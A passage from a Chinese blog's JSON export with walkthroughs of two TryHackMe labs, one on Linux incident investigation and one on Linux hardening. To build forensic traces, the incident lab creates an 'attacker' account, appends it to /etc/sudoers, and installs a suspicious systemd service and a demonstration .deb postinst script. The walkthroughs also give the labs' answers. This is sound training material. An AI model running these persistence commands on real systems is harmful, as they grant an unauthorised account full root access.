alt=\"control\"></p>\n<p>把这一行复制到control里面</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Package: malicious-package</span><br><span class=\"line\">Version: 1.0</span><br><span class=\"line\">Section: base</span><br><span class=\"line\">Priority: optional</span><br><span class=\"line\">Architecture: all</span><br><span class=\"line\">Maintainer: attacker@test.com</span><br><span class=\"line\">Description: This is a malicious Package</span><br></pre></td></tr></table></figure>\n\n<p>然后vim创建一个名字叫postinst的脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"># Malicious post-installation script</span><br><span class=\"line\"># It will run this script after installation</span><br><span class=\"line\"></span><br><span class=\"line\"># Print a suspicious message - for demonstration</span><br><span class=\"line\">echo &quot;something suspicious&quot;</span><br></pre></td></tr></table></figure>\n<p>给脚本赋权</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 755 malicious-package/DEBIAN/postinst(记得你的路径要搞对)</span><br></pre></td></tr></table></figure>\n\n<p>退回到malicious-package的根目录 构建安装包</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/goujian.png\" alt=\"goujian\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpkg -i malicious-package.deb</span><br></pre></td></tr></table></figure>\n<p>搞完这一一步<br>使用dpkg进行检查已经安装的包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpkg -l | grep malicious</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/jianchaanz.png\" alt=\"jiancha\"></p>\n<p>接着我们查看dpgk.log</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep &quot; install &quot; /var/log/dpkg.log</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/chackanzhuang.png\" alt=\"jiancha\"></p>\n<p>你会发现第二题的答案出来了 c2omm</p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E9%A2%98%E7%9B%AE7.png\" alt=\"task7\"></p>\n<p>其实看到题目一直被困在auth中 我以为只有一个 进入到&#x2F;var&#x2F;log中 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ll auth*</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>其实会发现三个auth的日志</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/auth.png\" alt=\"auth\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat auth.log | grep ssh</span><br><span class=\"line\">cat auth.log.1 | grep ssh</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/auth.png\" alt=\"auth\"></p>\n<p>题目说是ssh 我们就搜关键词 一个一个检查</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat auth.log | grep ssh</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/authlog2.png\" alt=\"check\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat auth.log.1 | grep ssh</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/authcheck.png\" alt=\"check\"></p>\n<p>到此所有任务就算完成了 只能说是做的过程波澜曲折了 可能也是我比较菜吧 继续加油</p>\n","excerpt":"","more":"<p>ok啊 因为下学期要来一个linux的课 我打算先把tryhackme的linux先搞一遍 学习学习linux的命令 方便下学期学习</p>\n<p>本次教程用了ps lsof journalctl dpkg命令 查了auth.log和dpkg.log 这些log中都得学会用grep命令 这个是真的好用</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20110940.png\" alt=\"开头\"></p>\n<p>我们用ssh先连接一下机子</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh tryhackme@ip</span><br></pre></td></tr></table></figure>\n\n<p>task3是一个看的文章 我们直接跳过</p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/task4.png\" alt=\"task4\"></p>\n<h3 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h3><p>我们按照文章所说 先运行一个简单程序<br>但首先记得先sudo su </p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20160531.png\" alt=\"第一步\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc simple.c -o /tmp/simple</span><br><span class=\"line\">/tmp/simple</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20160920.png\" alt=\"第1步\"></p>\n<p>这里的gcc是c的编译器</p>\n<h3 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h3><p>我们使用ps aux查看运行的进程<br>-aux 显示所有包含其他使用者的进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps aux | grep simple</span><br><span class=\"line\">搜索进程是simple这个名的</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20161218.png\" alt=\"第二步\"></p>\n<h3 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h3><p>这一步要用到我们刚才查询到的进程的pid</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsof -p pid</span><br><span class=\"line\">用来搜索对应pid的进程</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20161542.png\" alt=\"第三步\"></p>\n<p>lsof下面显示的东西等让我们对文件了解多一点</p>\n<h3 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h3><p>我们先回到&#x2F;home&#x2F;activities&#x2F;processes 启动一下netcom(.&#x2F;netcom) 这一步能让我们连接到远程ip的</p>\n<p>其实到这一步 我们已找到了第一题的答案</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsof -l -P-n</span><br><span class=\"line\">查找我们刚才的netcom进程</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20162402.png\" alt=\"第四步\"></p>\n<p>进入osquery </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">osqueryi</span><br><span class=\"line\">SELECT pid, fd, socket, local_address, remote_address,remote_port  FROM process_open_sockets WHERE pid =你的pid;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20163204.png\" alt=\"第四步\"></p>\n<p>一下子把端口和ip都搞到手了</p>\n<h3 id=\"第五步\"><a href=\"#第五步\" class=\"headerlink\" title=\"第五步\"></a>第五步</h3><p>开始之前 先运行这三个代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo useradd attacker -G sudo</span><br><span class=\"line\">sudo passwd attacker</span><br><span class=\"line\">echo &quot;attacker ALL=(ALL:ALL) ALL&quot; | sudo tee -a /etc/sudoers</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20165656.png\" alt=\"第五步\"></p>\n<p>假如我们cat一下auth.log的useradd字眼</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20165656.png\" alt=\"cat\"></p>\n<p>到etc的passwd里面查找<br><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-17%20171452.png\" alt=\"passwd\"></p>\n<p>你就能发现刚才操作的痕迹</p>\n<h3 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/task5.png\" alt=\"task\"></p>\n<p>先创建一个配置文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo nano /etc/systemd/system/suspicious.service</span><br></pre></td></tr></table></figure>\n<p>将以下复制粘贴进去</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Suspicious_Service</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">ExecStart=/home/activities/processes/suspicious</span><br><span class=\"line\">Restart=on-failure</span><br><span class=\"line\">User=nobody</span><br><span class=\"line\">Group=nogroup</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<p>然后重启一下服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">重新加载 systemd 管理器配置以识别新服务：</span><br><span class=\"line\">命令：sudo systemctl daemon-reload</span><br><span class=\"line\"></span><br><span class=\"line\">启用服务在启动时运行：</span><br><span class=\"line\">命令：sudo systemctl enable suspicious.service</span><br><span class=\"line\"></span><br><span class=\"line\">立即开始服务。</span><br><span class=\"line\">命令：sudo systemctl start suspicious.service</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/3%E4%B8%AAsys.png\" alt=\"第五\"></p>\n<p>我们能看到运行成功</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/running.png\" alt=\"第五\"></p>\n<p>运行成功之后到&#x2F;etc&#x2F;systemd&#x2F;system 中查找<br>你会发现一个叫benign.service的东西 cat一下就会发现他和我们写的那个脚本差不多</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/bengin.png\" alt=\"ben\"></p>\n<p>其中的execstart的benign就是题目需要的进程</p>\n<p>最后一题的话 就是搜索日记 一个一个数 直接输入journalctl可能要找一下九月11的记录 我们可以根据日志进行筛选 能看出有七个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">journalctl -u benign.service --since &quot;2024-09-11&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/journalctl.png\" alt=\"jour\"></p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/task6.png\" alt=\"task6\"></p>\n<p>创建一个目录 然后创建control文件和恶意脚本</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/control.png\" alt=\"control\"></p>\n<p>把这一行复制到control里面</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Package: malicious-package</span><br><span class=\"line\">Version: 1.0</span><br><span class=\"line\">Section: base</span><br><span class=\"line\">Priority: optional</span><br><span class=\"line\">Architecture: all</span><br><span class=\"line\">Maintainer: attacker@test.com</span><br><span class=\"line\">Description: This is a malicious Package</span><br></pre></td></tr></table></figure>\n\n<p>然后vim创建一个名字叫postinst的脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\"># Malicious post-installation script</span><br><span class=\"line\"># It will run this script after installation</span><br><span class=\"line\"></span><br><span class=\"line\"># Print a suspicious message - for demonstration</span><br><span class=\"line\">echo &quot;something suspicious&quot;</span><br></pre></td></tr></table></figure>\n<p>给脚本赋权</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">chmod 755 malicious-package/DEBIAN/postinst(记得你的路径要搞对)</span><br></pre></td></tr></table></figure>\n\n<p>退回到malicious-package的根目录 构建安装包</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/goujian.png\" alt=\"goujian\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpkg -i malicious-package.deb</span><br></pre></td></tr></table></figure>\n<p>搞完这一一步<br>使用dpkg进行检查已经安装的包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpkg -l | grep malicious</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/jianchaanz.png\" alt=\"jiancha\"></p>\n<p>接着我们查看dpgk.log</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep &quot; install &quot; /var/log/dpkg.log</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/chackanzhuang.png\" alt=\"jiancha\"></p>\n<p>你会发现第二题的答案出来了 c2omm</p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/%E9%A2%98%E7%9B%AE7.png\" alt=\"task7\"></p>\n<p>其实看到题目一直被困在auth中 我以为只有一个 进入到&#x2F;var&#x2F;log中 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ll auth*</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>其实会发现三个auth的日志</p>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/auth.png\" alt=\"auth\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat auth.log | grep ssh</span><br><span class=\"line\">cat auth.log.1 | grep ssh</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/auth.png\" alt=\"auth\"></p>\n<p>题目说是ssh 我们就搜关键词 一个一个检查</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat auth.log | grep ssh</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/authlog2.png\" alt=\"check\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat auth.log.1 | grep ssh</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Linux%20Incident%20Surface%E6%95%99%E7%A8%8B/authcheck.png\" alt=\"check\"></p>\n<p>到此所有任务就算完成了 只能说是做的过程波澜曲折了 可能也是我比较菜吧 继续加油</p>\n"},{"title":"Linux System Hardening教程","date":"2025-01-19T01:44:27.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/01/19/mYkxUA1XPHIheEV.png","_content":"第一次遇到困难难度的题 有点意思 怕不会是个难关哦 \n\n![title](/images/Linux%20System%20Hardening/linux.png)\n\n本房间涵盖了与Linux强化相关的各种主题。在本房间结束时，将通过以下方式了解有关如何提高Linux系统安全性的更多信息：\n\n- **物理安全**\n- **文件系统加密**\n- **防火墙配置**\n- **远程访问**\n- **软件和服务**\n- **更新和升级**\n- **日志**\n\n## task2\n这个是讲物理安全\n\n我们可以根据要保护的Linux系统考虑添加GRUB密码。许多工具都有助于实现这一点。其中一个工具是，它会提示您输入两次密码并为您生成哈希值。生成的哈希值应根据Linux发行版（例如：Fedora和Ubuntu）添加到相应的配置文件中。此配置将阻止未经授权的用户重置您的 root 密码。它将要求用户提供密码才能通过GRUB访问高级启动配置，包括以 root 访问权限登录。**grub2-mkpasswd-pbkdf2**\n\n我们能在文章中发现第一题的答案\n```\ngrub2-mkpasswd-pbkdf2\n```\ngrub2-mkpasswd-pbkdf2 是一个命令行工具，用于生成加密的密码哈希。\n\n生成的密码哈希使用 **PBKDF2**（Password-Based Key Derivation Function 2）算法，这是一种安全的密码哈希算法，可以有效防止彩虹表攻击和暴力破解。\n\n第二题也得出答案了 **Password-Based Key Derivation Function 2**\n\n## task3\n\n这个讲的是文件系统分区与加密\n\nluks(全称是**Linux Unified Key Setup** 是Linux系统中广泛使用的磁盘加密规范，它提供了一种强大且用户友好的标准化加密机制，通过对物理和逻辑磁盘分区内的数据进行加密来保护数据，确保只有授权用户才能访问加密分区的内容。)\n\nluks结构\n\n![disk](/images/Linux%20System%20Hardening/disk.png)\n\n- LUKS phdr：它代表**LUKS分区头**。LUKS phdr存储有关UUID（通用唯一标识符）、使用的密码、密码模式、密钥长度和主密钥的校验和的信息。\n  <br>\n- KM：KM 代表**密钥材料**，其中有 KM1、KM2、...、KM8。每个密钥材料部分都与一个密钥槽相关联，该密钥槽可以在LUKS phdr 中指示为活动状态。\n  换句话说，我们可能使用第一个用户的密码加密主密钥并保存在 KM1 中，使用第二个用户的密码加密主密钥并保存在 KM2 中，依此类推。\n  <br>\n- 批量数据：这是指**使用主密钥加密的数据**。主密钥保存在密钥材料部分中，并使用用户的密码进行加密。\n\n我们看看问题\n\n![task3](/images/Linux%20System%20Hardening/task3.png)\n\n第一问 luks全称叫**Linux Unified Key Setup**\n\n第二问真的有难度 看看提示 把提示的命令粘贴进去\n\n![3](/images/Linux%20System%20Hardening/3.png)\n\n然后到myvault里面就能看到答案\n\n![3](/images/Linux%20System%20Hardening/3%201.png)\n\n\n```\nsudo cryptsetup open --type luks secretvault.img myvault && sudo mount /dev/mapper/myvault myvault/\n```\n\n### 命令解释\n\n **sudo cryptsetup open --type luks secretvault.img  myvault**\n\n - **sudo**：以超级用户权限运行命令，因为解密和挂载操作通常 需要管理员权限。\n - **cryptsetup**：用于管理加密设备的命令行工具。\n - **open**：cryptsetup的子命令，用于打开一个加密设备。\n - **--type luks**：指定加密设备的类型为LUKS（Linux  Unified Key Setup）。\n - **secretvault.img**：加密图像文件的路径。\n - **myvault**：解密后的设备映射器名称，用于在/dev/ mapper/下创建一个设备节点。\n 这个命令的作用是将**secretvault.img**文件解密，并创建一个 设备映射器/dev/mapper/myvault，以便后续可以挂载这个设备。\n \n ---\n**sudo mount /dev/mapper/myvault myvault/**\n\n- **sudo** ：以超级用户权限运行命令。\n- **mount**：用于挂载文件系统的命令。\n- **/dev/mapper/myvault**：解密后的设备映射器路径。\n- <strong>*myvault/</strong>：挂载点目录，解密后的文件系统将挂载到这个目录。\n  \n这个命令的作用是将解密后的设备/dev/mapper/myvault挂载到myvault/目录，使得你可以访问其中的文件\n\n## task4\n这一个部分讲的是防火墙\n\n设置防火墙有很多安全优势。首先，防火墙规则可以精细控制哪些数据包可以离开系统以及哪些数据包可以进入系统。因此，防火墙规则通过控制设备之间的网络流量来帮助减轻各种安全风险。\n\n更重要的是，可以制定防火墙规则来确保没有客户端可以充当服务器。换句话说，攻击者无法在目标计算机上启动可访问的侦听端口；漏洞利用者可以启动侦听端口，但防火墙将阻止所有传入的连接尝试。\n\n  防火墙有两个主要功能：\n\n- 1.什么可以进入？允许或拒绝数据包进入系统。\n- 2.什么可以离开？允许或拒绝数据包离开系统。\n\n进入防火墙规则的 IP 标头字段包括：\n\n- 源 IP 地址\n- 目标 IP 地址\n  \n防火墙规则主要关注的TCP / UDP标头字段是：\n\n- 源TCP / UDP端口\n- 目标TCP / UDP端口\n\nnetfilter 为Linux内核 2.4.x 及更高版本提供数据包过滤软件。netfilter 需要(例如**iptables**或 **nftables**来管理。)\n\n说有点多了 我们直接看题\n\n![task4](/images/Linux%20System%20Hardening/firewall.png)\n\n前面提到**iptables** 我们就直接用iptables列出防火墙的规则 用grep过滤出我们想要的\n\n```\niptables --list | grep tcp\niptables --list | grep ucp\n```\n![task4](/images/Linux%20System%20Hardening/tcp.png)\n\n![task4](/images/Linux%20System%20Hardening/udp.png)\n\n\n## task5\n远程访问\n常见的攻击包括：\n- 密码嗅探\n- 密码猜测和暴力破解\n- 利用监听服务\n\n\n![task5](/images/Linux%20System%20Hardening/task5.png)\n\n查看sshd_config的隐藏 flag\n\n直接进入/etc/ssh/sshd_config查看就行了\n\n![sshd](/images/Linux%20System%20Hardening/sshd.png)\n\n\n## task6\n讲的是用户账户安全\n\n### 使用 sudo\n为了避免以身份登录root，更好的方法是将为管理目的创建的帐户添加到**sudoers** （即可以使用该sudo命令的组）。sudo代表超级用户执行，它应该在任何需要root特权的命令之前。\n\n据Linux发行版，我们可以通过以下方式将用户添加到 sudoers 组。某些发行版（例如 Debian 和 Ubuntu）将 sudoers 称为组**sudo**\n\n```\nusermod -aG sudo username\n```\n\n其他发行版（例如 RedHat 和 Fedora）将 sudoers 组称为**wheel**。\n\n```\nusermod -aG wheel username  \n```\n\n### 禁用未使用的用户\n一种简单的方法是编辑<strong>/etc/passwd</strong>文件并将我们要禁用的用户帐户的 shell 设置为/sbin/nologin。\n\n### 禁用 root\n一旦创建了用于管理目的的帐户并将其添加到**sudo/wheel**组，您可能会考虑禁用该root帐户。\n一种直接的方法是修改<strong>/etc/passwd</strong> 将 shell 更改root为<strong>/sbin/nologin</strong>。换句话说，编辑/etc/passwd并将行更改**bin/bash** 为 **/sbin/nologin**。\n\n我们看看题目\n\n![task6](/images/Linux%20System%20Hardening/task6.png)\n\n第一题/sbin/nologin\n\n第二题很显而易见 wheel\n\n第三题sudo\n\n第四题 问sudo组里面还有谁 我们之间grep一下/etc/group就可以知道1\n\n```\ncat group | grep sudo\n```\n\n![group](/images/Linux%20System%20Hardening/group.png)\n\n## task7\n\n软件和服务\n\n系统上安装的每款软件都会增加潜在漏洞的数量。换句话说，安装额外的软件包和新服务会增加攻击者可利用的漏洞，从而访问系统，并最终访问网络上的其他系统。\n\n- 禁用不必要的服务\n改善安全状况的最简单方法之一是删除或禁用不需要的服务和软件包。每个软件包都有一定的风险，而且我们无法知道何时会发现相关的漏洞。\n\n- 阻止不需要的网络端口\n删除所有不需要的软件包并禁用可能不会被删除的预安装服务后，相应地设置防火墙规则至关重要。\n\n- 避免使用遗留协议\n过去，Telnet 曾是远程访问系统的主要协议；TFTP 协议通常用于传输文件。随着安全替代方案的发布，不应再允许使用此类协议。\n- eg：\nSSH协议现已广泛使用，取代了 Telnet 。例如，安全文件传输议 (**SFTP**) 协议为 TFTP 协议提供了很好的替代方案。关键在选择和使用安全的替代方案。\n\n- 删除识别字符串\n每当你连接到远程服务器时，它通常会回复其版本号。此信息会向攻击者透露各种信息，例如服务器/程序的名称、版本号和主机操作系统。\n\n根据上面的文字 能知道 task7的答案是sftp(替代了tftp)\n\n## task8\n升级和更新策略\n以下两个命令更新基于 Debian 的发行版，例如 Ubuntu：\n\n```\napt update从配置的源下载包信息\napt upgrade从配置的源安装所有软件包的可用升级\n```\n\n以下命令更新 RedHat 或 Fedora 系统：\n\n```\ndnf update在较新版本上（Red Hat Enterprise Linux 8 及更高版本）\nyum update在旧版本上（Red Hat Enterprise Linux 7 及更早版本）\n```\n这个是题目\n\n![task8](/images/Linux%20System%20Hardening/task8.png)\n\n前面几题其实就是基础知识 百度啥的都可以知道 直接复制粘贴就完了\n\n最后一题的话 进/etc/apt/source.list就可以看到flag\n\n![source](/images/Linux%20System%20Hardening/source.png)\n\n## task9\n\n![task9](/source/images/Linux%20System%20Hardening/task9.png)\n\n这两天就是看你的**tail**和**grep**命令的使用了\n\n```\ntail -n 15 kern.log\ngrep denied source\n```\n结束这场战斗了 算比较深一点点了解linux在安全上的各种措施。要把这些用在实际的地方在是关键","source":"_posts/Linux-System-Hardening教程.md","raw":"---\ntitle: Linux System Hardening教程\ndate: 2025-01-19 09:44:27\ntags: linux 安全 管理\ntop_img: transparent\ncover: https://s2.loli.net/2025/01/19/mYkxUA1XPHIheEV.png\n---\n第一次遇到困难难度的题 有点意思 怕不会是个难关哦 \n\n![title](/images/Linux%20System%20Hardening/linux.png)\n\n本房间涵盖了与Linux强化相关的各种主题。在本房间结束时，将通过以下方式了解有关如何提高Linux系统安全性的更多信息：\n\n- **物理安全**\n- **文件系统加密**\n- **防火墙配置**\n- **远程访问**\n- **软件和服务**\n- **更新和升级**\n- **日志**\n\n## task2\n这个是讲物理安全\n\n我们可以根据要保护的Linux系统考虑添加GRUB密码。许多工具都有助于实现这一点。其中一个工具是，它会提示您输入两次密码并为您生成哈希值。生成的哈希值应根据Linux发行版（例如：Fedora和Ubuntu）添加到相应的配置文件中。此配置将阻止未经授权的用户重置您的 root 密码。它将要求用户提供密码才能通过GRUB访问高级启动配置，包括以 root 访问权限登录。**grub2-mkpasswd-pbkdf2**\n\n我们能在文章中发现第一题的答案\n```\ngrub2-mkpasswd-pbkdf2\n```\ngrub2-mkpasswd-pbkdf2 是一个命令行工具，用于生成加密的密码哈希。\n\n生成的密码哈希使用 **PBKDF2**（Password-Based Key Derivation Function 2）算法，这是一种安全的密码哈希算法，可以有效防止彩虹表攻击和暴力破解。\n\n第二题也得出答案了 